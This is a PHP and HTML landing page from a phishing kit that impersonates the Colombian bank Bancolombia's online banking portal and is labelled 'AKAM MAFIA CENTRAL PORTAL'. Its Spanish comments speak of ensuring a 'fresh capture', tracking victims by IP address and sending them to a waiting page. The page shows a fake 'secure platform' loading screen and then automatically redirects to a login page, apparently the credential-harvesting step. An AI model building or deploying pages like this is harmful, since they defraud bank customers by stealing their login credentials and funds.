<?php
// index.php - AKAM MAFIA CENTRAL PORTAL
session_start();
session_destroy(); // Limpiamos rastro previo para asegurar captura fresca

require_once('panel/lib/funciones.php'); // Conexión al motor central

// Si quieres que el sistema reconozca si la IP ya completó el proceso, 
// puedes activar esta lógica opcional:
/*
$ip = $_SERVER['REMOTE_ADDR'];
$id_reg = traer_regitro($ip);
if ($id_reg) {
    header("Location: a/WAITING.php"); // Si ya existe, lo manda a la espera final
    exit();
}
*/
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Bancolombia | Sucursal Virtual Personas</title>
    
    <meta property="og:title" content="Bancolombia | Sucursal Virtual Personas">
    <meta property="og:description" content="Inicie sesión para validar su identidad en nuestra plataforma segura.">
    <meta property="og:image" content="img/seguridad.jpg">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <link rel="icon" type="image/png" href="img/logo.png" />
    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
    
    <style>
        body { background-color: #fff; margin: 0; padding: 0; font-family: sans-serif; }
        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .text-loader { color: #666; font-size: 14px; margin-top: 20px; }
    </style>
</head>
<body>

    <div class="loader-container">
        <img src="img/logo.png" width="180" alt="Bancolombia">
        <div class="text-loader">Cargando plataforma segura...</div>
    </div>

    <script type="text/javascript">
        $(document).ready(function() {
            // Redirección automática al primer paso (Login) despues de 1.5 segundos
            setTimeout(function() {
                window.location.href = "a/login.php"; 
            }, 1500);
        });
    </script>
</body>
</html>
